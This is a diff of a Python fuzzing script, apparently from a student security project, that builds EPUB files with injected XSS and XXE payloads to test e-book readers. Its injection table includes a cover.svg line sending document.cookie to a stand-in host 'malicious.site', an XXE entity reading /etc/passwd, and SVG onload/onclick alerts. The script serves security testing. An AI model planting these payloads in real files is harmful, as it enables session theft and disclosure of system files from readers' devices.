@@ -6,10 +6,10 @@ from datetime import datetime
 from playwright.sync_api import sync_playwright
 
 # 配置路径
-# PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\epub_web_fuzz\XSS Injection\Intruders\xss_payloads_quick.txt"
+PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\epub_web_fuzz\XSS Injection\Intruders\xss_payloads_quick.txt"
 # PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XSS Injection\Intruders\JHADDIX_XSS.txt"
 # PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XXE Injection\Intruders\XXE_Fuzzing.txt"
-PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XSS Injection\Intruders\JHADDIX_XSS.txt"
+# PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XSS Injection\Intruders\JHADDIX_XSS.txt"
 
 BASE_DIR = r".\epub_gen_data"
 OUTPUT_DIR = r".\epub_gen_data\epub_gen"
@@ -135,61 +135,53 @@ def prepare_template():
             f.write(content)
 
 
+
 def generate_malicious_epub(payload: str, index: int) -> list:
-    """生成包含单个Payload的多个EPUB文件（每个注入点单独生成）"""
+    """生成包含单个Payload的多个EPUB文件，并在子文件夹中保存payload文本"""
     generated_files = []
 
-    # 定义所有注入点（新增SVG和XML注入点）
     injection_points = {
         "OEBPS/Text.xhtml": [
             ("<!-- XSS_PAYLOAD -->", f'{payload}'),
-            ("<!-- SVG_IMAGE_INJECTION -->",
-            '''<svg/onload=alert(1)>''')
+            ("<!-- SVG_IMAGE_INJECTION -->", '<svg/onload=alert(1)>')
         ],
         "OEBPS/cover.svg": [
-            ("<rect ", f'<rect onclick="alert(\'SVG\')" '),  # SVG事件注入
-            ("// SVG_SCRIPT_PAYLOAD", 
-            "fetch('http://malicious.site/'+document.cookie)"),
-            ("<!-- SVG_EVENT_PAYLOAD -->",
-            '<rect x="0" y="0" width="100" height="100" onclick="alert(1)"/>')
+            ("<rect ", '<rect onclick="alert(\'SVG\')" '),
+            ("// SVG_SCRIPT_PAYLOAD", "fetch('http://malicious.site/'+document.cookie)"),
+            ("<!-- SVG_EVENT_PAYLOAD -->", '<rect x="0" y="0" width="100" height="100" onclick="alert(1)"/>')
         ],
         "OEBPS/toc.xhtml": [
             ("<!-- MALICIOUS_LINK -->", f'{payload}'),
-            ("<!-- XXE_INJECTION -->",f'{payload}'),
-            ("<!-- XSS_INJECTION -->",f'{payload}'),
+            ("<!-- XXE_INJECTION -->", f'{payload}'),
+            ("<!-- XSS_INJECTION -->", f'{payload}')
         ],
         "OEBPS/metadata.xml": [
             ("<!-- METADATA_TITLE -->", f"Test Book {payload}"),
             ("<!-- XML_PI_INJECTION -->", f"{payload}")
         ],
         "OEBPS/content.opf": [
-            ("<!-- TITLE_PAYLOAD -->", 
-             f"Test Book <![CDATA[{payload}]]>"),
-             ("<!-- TITLE_PAYLOAD -->", 
-            f"Test Book <!ENTITY xxe SYSTEM 'file:///etc/passwd'>")
+            ("<!-- TITLE_PAYLOAD -->", f"Test Book <![CDATA[{payload}]]>"),
+            ("<!-- TITLE_PAYLOAD -->", f"Test Book <!ENTITY xxe SYSTEM 'file:///etc/passwd'>")
         ]
     }
 
-    # 为每个注入点生成单独的文件
     for rel_path, replacements in injection_points.items():
-        # 为每个替换规则创建独立实例
+        base_folder = rel_path.replace("/", "_")
         for replace_index, (old_str, new_str) in enumerate(replacements):
-            # 创建唯一临时目录
-            temp_dir = os.path.join(OUTPUT_DIR, f"temp_{index}_{replace_index}")
-            output_dir = os.path.join(OUTPUT_DIR, 
-                                    rel_path.replace("/", "_"), 
-                                    f"case_{index:04d}")
+            # 每个替换点独立case目录
+            case_dir = f"case_{index:04d}_{replace_index:02d}"
+            output_dir = os.path.join(OUTPUT_DIR, base_folder, case_dir)
             os.makedirs(output_dir, exist_ok=True)
-            
-            # 生成唯一文件名
-            output_file = os.path.join(output_dir, 
-                                     f"payload_{replace_index:02d}.epub")
 
+            # 生成epub和payload文件名
+            epub_name = f"payload_{replace_index:02d}.epub"
+            txt_name = f"payload_{replace_index:02d}.txt"
+            output_epub = os.path.join(output_dir, epub_name)
+            output_txt = os.path.join(output_dir, txt_name)
+
+            temp_dir = os.path.join(OUTPUT_DIR, f"temp_{index}_{replace_index}")
             try:
-                # 复制原始模板
                 shutil.copytree(TEMPLATE_DIR, temp_dir, dirs_exist_ok=True)
-
-                # 修改目标文件
                 target_file = os.path.join(temp_dir, rel_path)
                 if os.path.exists(target_file):
                     with open(target_file, "r+", encoding="utf-8") as f:
@@ -197,15 +189,10 @@ def generate_malicious_epub(payload: str, index: int) -> list:
                         f.seek(0)
                         f.write(content)
                         f.truncate()
-
-                # 打包EPUB（保持规范结构）
-                with zipfile.ZipFile(output_file, "w") as zf:
-                    # 先添加未压缩的mimetype
+                # 打包EPUB
+                with zipfile.ZipFile(output_epub, "w") as zf:
                     mimetype_path = os.path.join(temp_dir, "mimetype")
-                    zf.write(mimetype_path, "mimetype", 
-                            compress_type=zipfile.ZIP_STORED)
-
-                    # 添加其他文件
+                    zf.write(mimetype_path, "mimetype", compress_type=zipfile.ZIP_STORED)
                     for root, _, files in os.walk(temp_dir):
                         for file in files:
                             if file == "mimetype":
@@ -213,17 +200,18 @@ def generate_malicious_epub(payload: str, index: int) -> list:
                             full_path = os.path.join(root, file)
                             arcname = os.path.relpath(full_path, temp_dir)
                             zf.write(full_path, arcname)
+                # 保存payload到文本文件
+                with open(output_txt, "w", encoding="utf-8") as tf:
+                    tf.write(payload)
 
-                generated_files.append(output_file)
-                print(f"✅ 生成成功 [{rel_path}]：{output_file}")
-
+                generated_files.append(output_epub)
+                print(f"✅ 生成成功 [{rel_path}]：{output_epub}")
             except Exception as e:
                 print(f"❌ 生成失败 [{rel_path}]：{str(e)}")
             finally:
                 shutil.rmtree(temp_dir, ignore_errors=True)
 
     return generated_files
-
 
 
 if __name__ == '__main__':
